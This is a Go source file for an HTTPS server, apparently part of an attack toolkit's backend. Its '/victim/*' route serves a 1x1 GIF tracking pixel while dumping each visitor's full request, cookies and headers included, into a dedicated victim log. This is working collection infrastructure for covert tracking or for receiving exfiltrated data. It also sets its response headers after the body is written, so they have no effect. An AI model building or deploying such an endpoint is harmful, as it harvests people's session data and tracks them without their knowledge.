package main

import (
	"github.com/go-chi/chi"
	"github.com/go-chi/chi/middleware"
	"github.com/joho/godotenv"
	"github.com/seeker-admin/admin-backend/log"
	"image"
	"image/color"
	"image/gif"
	"net/http"
	"net/http/httputil"
	"os"
)

var img1x1 *image.RGBA

func init() {
	img1x1 = image.NewRGBA(image.Rect(0, 0, 1, 1))
	img1x1.Set(0, 0, color.RGBA{A: 255})
}

func main() {
	if err := godotenv.Load(); err != nil {
		log.Error("Can't load .env file")
	}

	r := chi.NewRouter()
	r.Use(middleware.Logger)
	r.Get("/victim/*", victimRoute)

	certFile := os.Getenv("SSL_CERT_FILE_PATH")
	keyFile := os.Getenv("SSL_PRIVKEY_FILE")

	log.Info("Listening at localhost:443")
	err := http.ListenAndServeTLS(":443", certFile, keyFile, r)
	if err != nil {
		log.Error(err)
		return
	}
}

func victimRoute(writer http.ResponseWriter, request *http.Request) {
	requestData, err := httputil.DumpRequest(request, true)
	if err != nil {
		log.Error(err)
	}

	if err := gif.Encode(writer, img1x1, nil); err != nil {
		log.Error(err)
	}

	writer.Header().Set("Content-Type", "image/gif")

	writer.WriteHeader(http.StatusOK)

	log.VictimLog(string(requestData))
}
